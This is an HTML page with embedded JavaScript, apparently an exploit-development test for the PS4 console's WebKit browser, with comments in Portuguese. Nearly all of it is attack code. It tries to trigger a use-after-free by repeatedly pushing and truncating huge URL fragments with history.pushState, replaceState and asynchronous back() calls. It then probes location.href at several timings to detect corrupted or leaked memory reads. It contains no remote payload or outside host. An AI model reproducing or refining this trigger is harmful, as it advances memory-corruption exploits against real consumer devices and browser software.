
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – UAF Entropy Reconstruction Test</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin:4px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – UAF Variability Reconstruction</h2>

<button onclick="runTest()">RUN TEST (NO RESET)</button>
<button onclick="clearLog()">CLEAR LOG</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* =================================================
   PHASE 1 — CONFIRMED UAF TRIGGER (SEU ORIGINAL)
   ================================================= */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);

        // replaceState parcial e variável
        let cut = [31,33,35,47,63][i % 5];
        history.replaceState({}, "", "#"+frag.slice(0, cut));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5 + (Math.random()*5));
    }
    log(">>> UAF WINDOW <<<");
}

/* =================================================
   PHASE 2 — NON-DETERMINISTIC READS
   ================================================= */
function probe(label){
    let u = location.href;
    log(`[${label}] URL.length = ${u.length}`);
    [16,32,48,64,96,128,256].forEach(o=>{
        try {
            log(`[${label}] charCodeAt(${o}) = ${u.charCodeAt(o)}`);
        } catch(e){
            log(`[${label}] charCodeAt(${o}) = EX`);
        }
    });
}

async function runTest(){
    log("\n================ RUN =================");

    await triggerUAF();

    // leitura imediata
    probe("IMMEDIATE");

    // microtask
    Promise.resolve().then(()=>{
        probe("MICROTASK");
    });

    // macrotask
    setTimeout(()=>{
        probe("TIMEOUT-0");
    },0);

    // frame boundary
    requestAnimationFrame(()=>{
        probe("RAF");
    });

    // atraso leve com entropia
    setTimeout(()=>{
        probe("TIMEOUT-RAND");
    }, 5 + Math.random()*20);
}

function clearLog(){
    logEl.textContent = "";
}
</script>

</body>
</html>
